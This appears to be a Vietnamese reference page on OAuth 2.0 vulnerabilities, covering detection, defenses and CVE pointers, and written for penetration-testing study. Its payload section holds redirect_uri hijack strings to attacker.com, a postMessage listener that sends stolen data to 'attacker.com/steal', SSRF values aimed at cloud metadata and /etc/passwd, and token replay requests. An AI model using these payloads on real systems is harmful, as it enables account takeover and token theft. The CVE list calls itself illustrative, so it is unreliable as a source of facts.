# OAuth 2.0 Vulnerabilities

> Các luồng OAuth triển khai sai làm rò rỉ token hoặc cho phép chiếm tài khoản. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/oauth.md`](../../../../Troubleshooting_Guide/oauth.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** A07:2021
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Lỗ hổng OAuth 2.0 là những thiếu sót trong cách một ứng dụng client hoặc máy chủ ủy quyền triển khai
luồng ủy quyền được giao phó (delegated-authorization), cho phép kẻ tấn công đánh cắp các mã ủy quyền hoặc
token, hoặc cướp tiến trình "đăng nhập bằng X". Bản thân giao thức là vững chắc; các lỗi gần như luôn nằm
ở việc kiểm tra và xử lý luồng tại các điểm tích hợp.

## Cơ chế hoạt động (How it works)
Kẻ tấn công kiểm soát các tham số request trong luồng ủy quyền — `redirect_uri`, `state`,
`scope`, `client_id`, và các URI được cung cấp như `logo_uri` — và client/server kiểm tra chúng
lỏng lẻo. Việc khớp `redirect_uri` yếu gửi mã ủy quyền tới một host của kẻ tấn công; một `state` thiếu
hoặc dễ đoán cho phép CSRF và ép liên kết tài khoản; một open redirect hoặc `Referer` rò rỉ
trích xuất mã; các JWT `id_token` kế thừa các lỗ hổng chữ ký; và PKCE có thể bị hạ cấp để một
mã bị đánh cắp có thể đổi được mà không cần verifier. Sai lầm cốt lõi là tin tưởng các giá trị do
client cung cấp vốn quyết định nơi các secret được phân phối.

## Tác động (Impact)
Chiếm tài khoản của nạn nhân trên ứng dụng tin cậy (relying application), đánh cắp token truy cập/làm mới
(access/refresh), và truy cập các tài nguyên trong phạm vi mà những token đó cấp. SSRF qua các URI được fetch
có thể tới được metadata cloud và các dịch vụ nội bộ. Mức độ nghiêm trọng thường là cao đến nghiêm trọng,
vì một cuộc tấn công thành công mạo danh nạn nhân từ đầu đến cuối.

## Cách phát hiện (How to detect)
- Nhà cung cấp chấp nhận một `redirect_uri` đã sửa đổi (host, subdomain, đường dẫn khác, hoặc
  mẹo `@`/`%2f`/`\`) mà vẫn cấp một mã.
- Luồng vẫn hoạt động với `state` rỗng, dùng lại, hoặc bị loại bỏ — không có ràng buộc CSRF.
- Các mã ủy quyền xuất hiện trong header `Referer`, dữ liệu `postMessage`, hoặc tồn tại qua việc phát lại sau khi
  đăng xuất.
- Các endpoint đăng ký hoặc metadata fetch một URL do client cung cấp (`logo_uri`, `jku`) — dò tìm
  SSRF.
- `id_token` là một JWT mà `alg` hoặc việc xử lý khóa của nó có thể bị can thiệp (xem thẻ `jwt`).

## Khai thác (tóm tắt) (Exploitation)
Lập bản đồ các endpoint của nhà cung cấp, rồi kiểm tra việc kiểm tra `redirect_uri` để chuyển hướng mã tới một
host của kẻ tấn công. Ở nơi `state` yếu, ép liên kết tài khoản mạng xã hội của kẻ tấn công với nạn nhân hoặc
lợi dụng một CSRF. Nối một open redirect cùng site hoặc một tài nguyên nhúng rò rỉ để trích xuất mã,
phát lại các mã/refresh token đã bắt được, hạ cấp PKCE, và lạm dụng `logo_uri` cho SSRF. Payload đầy đủ
nằm ở mục Payload phía dưới.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Recon: endpoint & tham số (Recon: endpoints & parameters)
Lập bản đồ nhà cung cấp trước khi tấn công. Các endpoint phổ biến:

```text
/.well-known/openid-configuration
/.well-known/oauth-authorization-server
/.well-known/jwks.json
/auth, /authorization, /oauth/authorize, /connect/authorize
/oauth/token, /connect/token
/callback, /oauth/userinfo, /oauth/revoke
```

Các tham số quan trọng cho việc giả mạo:

| Tham số | Mục đích |
|-----------|---------|
| `client_id` | Định danh ứng dụng |
| `redirect_uri` | Nơi người dùng được gửi tới sau khi xác thực |
| `response_type` | `code`, `token`, `id_token` |
| `scope` | Các quyền được yêu cầu |
| `state` | Token bảo vệ CSRF |
| `code_challenge` / `code_verifier` | Thách thức PKCE / secret |

### Vượt xác thực qua giả mạo hồ sơ (Authentication bypass via profile tampering)
Chặn POST tới `/authenticate` và thay thế định danh của nạn nhân trong khi giữ trường liên hệ của riêng bạn.

```http
POST /authenticate
Content-Type: application/json

{"email":"attacker@evil.com","username":"victim"}
```

### Cướp redirect_uri (redirect_uri hijacking)
Kiểm tra xem nhà cung cấp có kiểm tra `redirect_uri` một cách nghiêm ngặt không. Đổi callback hợp lệ lấy một host của kẻ tấn công:

```text
https://TARGET/auth?client_id=xxx&redirect_uri=https://attacker.com/callback&response_type=code&state=xxx
```

Các cách vượt qua kiểm tra domain và cấu hình sai wildcard:

```text
redirect_uri=https://legitimate-domain.attacker.com/
redirect_uri=https://legitimate-domain.com.attacker.com/
redirect_uri=https://target.com.attacker.com/
redirect_uri=https://target.com%2f@attacker.com/
redirect_uri=https://target.com\@attacker.com/
redirect_uri=https://*
redirect_uri=https://*.attacker.com
```

### CSRF / ép liên kết tài khoản (CSRF / forced account linking)
Khi không có (hoặc có thể đoán được) `state`, kẻ tấn công có thể gắn tài khoản mạng xã hội của họ với phiên của nạn nhân qua một iframe ẩn.

```html
<iframe src="https://TARGET/auth?client_id=xxx&scope=openid,email,profile&response_type=code&redirect_uri=https://TARGET/auth/callback&state=ATTACKER_STATE_VALUE&approval_code=REAL_USER_CODE"></iframe>
```

Các điểm yếu của tham số state cần dò: `&state=` rỗng hoặc một giá trị đã biết/dùng lại `&state=known_value`.

### SSRF qua logo_uri (SSRF via logo_uri)
Nếu endpoint đăng ký fetch một `logo_uri` do client cung cấp, trỏ nó vào trong nội bộ.

```text
logo_uri=http://169.254.169.254/latest/meta-data/
logo_uri=http://169.254.169.254/latest/user-data/
logo_uri=http://metadata.google.internal/computeMetadata/v1/
logo_uri=http://169.254.169.254/metadata/v1/InstanceAttributes/keys
logo_uri=http://127.0.0.1:8080/admin
logo_uri=http://internal.corp/private/secrets
logo_uri=file:///etc/passwd
logo_uri=file:///C:/Windows/System32/drivers/etc/hosts
```

### Đánh cắp token qua open redirect (Token theft via open redirect)
Nối một open redirect cùng site vào luồng OAuth để mã ủy quyền rơi vào host của kẻ tấn công.

```text
Step 1: POST /authenticate with email change
Step 2: redirect via /post/next?path=https://attacker.com
Result: https://TARGET/post/next?path=https://attacker.com?code=STOLEN_CODE
```

Các biến thể redirect dựa trên đường dẫn:

```text
/callback/post/redirect?path=//attacker.com
/callback/../redirect?path=//attacker.com
/callback/redirect?path=https://target.com.evil.com
```

### Rò rỉ token qua Referer / postMessage (Token leakage via Referer / postMessage)
Mã có thể rò rỉ qua header `Referer` của một tài nguyên nhúng, hoặc qua một bộ lắng nghe `postMessage` quá dễ dãi.

```html
<img src="https://TARGET/callback?code=LEAKED_CODE" referrerpolicy="no-referrer">
```

```javascript
window.addEventListener('message', function(e) {
  fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(e.data)));
});
// on the OAuth page:
window.parent.postMessage({oauth: window.location.href}, '*');
```

### Tấn công trộn lẫn (nhiều IdP) (Mix-up attack)
Khởi động một luồng với một IdP độc hại, rồi đưa một mã do kẻ tấn công kiểm soát vào callback của nhà cung cấp hợp lệ.

```text
GET /auth?response_type=code&client_id=CLIENT_ID&idp=evil
GET /callback?idp=evil&code=ATTACKER_CODE
```

### Nhầm lẫn thuật toán id_token / JWT (id_token / JWT algorithm confusion)
Các token danh tính OAuth là JWT và kế thừa cùng các lỗ hổng chữ ký. Ép `alg:none` (dấu chấm cuối, chữ ký rỗng) hoặc lấy khóa công khai và ký lại dưới dạng HS256.

```text
GET /.well-known/jwks.json
GET /auth/keys
# re-sign the id_token with HS256 using the RSA public key as the HMAC secret
```

### Hạ cấp PKCE (PKCE downgrade)
Loại bỏ hoặc làm yếu PKCE để một mã bị đánh cắp có thể được đổi mà không cần verifier.

```text
# remove code_challenge and code_challenge_method entirely, or:
code_challenge_method=plain
```

### Phát lại token, dùng lại refresh & lạm dụng bearer (Token replay, refresh reuse & bearer abuse)
Bắt một mã ủy quyền và phát lại nó sau khi đăng xuất, dùng lại một refresh token bị đánh cắp, hoặc trình một access token bị đánh cắp một cách trực tiếp.

```http
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=CAPTURED_CODE&redirect_uri=https://TARGET/callback&client_id=CLIENT_ID
```

```http
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token&refresh_token=STOLEN_REFRESH_TOKEN&client_id=CLIENT_ID
```

```http
GET /api/user HTTP/1.1
Host: api.target.com
Authorization: Bearer ATTACKER_ACCESS_TOKEN
```

### Phân tích state / prototype pollution (State parsing / prototype pollution)
Nếu giá trị `state` được deserialize, hãy kiểm tra các gadget prototype-pollution.

```text
__proto__[foo]=bar
constructor[prototype][foo]=bar
"__proto__":{"foo":"bar"}
```

## Phòng chống (Defenses)
1. **Khớp `redirect_uri` nghiêm ngặt** — danh sách cho phép đăng ký trước, khớp chính xác, không có wildcard hoặc
   khớp đường dẫn một phần; từ chối bất kỳ thứ gì không khớp chính xác.
2. **`state` bắt buộc** — ngẫu nhiên về mặt mật mã, dùng một lần, gắn với phiên người dùng, và
   được xác minh khi callback để chặn các tấn công CSRF và liên kết tài khoản.
3. **Bắt buộc PKCE** (S256) cho mọi client, đặc biệt là client công khai/native; từ chối `plain` và các thách thức
   bị thiếu.
4. **Bảo vệ mã trên đường truyền** — mã ủy quyền tồn tại ngắn, dùng một lần; tránh các open
   redirect; đặt `referrerpolicy`/Referrer-Policy để mã không bao giờ rò rỉ qua `Referer`.
5. **Xác thực `id_token` đúng cách** — ghim thuật toán, xác minh chữ ký, `iss`, `aud`, và
   `nonce` (xem thẻ `jwt`).
6. **Khóa chặt các URI do server fetch** — kiểm tra/allow-list `logo_uri`, `jku`, v.v., và chặn
   các request tới các địa chỉ nội bộ/metadata để ngăn SSRF.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=OAuth+2.0+Vulnerabilities
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=OAuth+2.0+Vulnerabilities
- **Exploit-DB** — https://www.exploit-db.com/search?q=OAuth+2.0+Vulnerabilities
- **GitHub Advisories** — https://github.com/advisories?query=OAuth+2.0+Vulnerabilities
- **OSV** — https://osv.dev/list?q=OAuth+2.0+Vulnerabilities
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, X/Twitter infosec.
- _Mẹo tìm kiếm: thêm sản phẩm mục tiêu + phiên bản, ví dụ `OAuth 2.0 Vulnerabilities <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi dựa vào chi tiết._
- `CVE-2020-26877` — xử lý open-redirect/`redirect_uri` cho phép đánh cắp mã OAuth (minh họa cho lớp lỗ hổng này).
- `CVE-2022-23607` — lỗ hổng OAuth trong Authlib (Python) ở việc xử lý token/redirect.
- _Sự cố kinh điển: các chuỗi chiếm tài khoản "redirect_uri + open redirect" kiểu Microsoft/GitHub năm 2021 được báo cáo rộng rãi trên HackerOne._

## Tham khảo (References)
- PortSwigger Web Security Academy — OAuth 2.0 authentication vulnerabilities.
- OWASP — OAuth 2.0 / OpenID Connect security và OAuth 2.0 Security Best Current Practice.
- RFC 6749 — OAuth 2.0; RFC 7636 — PKCE; RFC 6819 — OAuth 2.0 Threat Model.
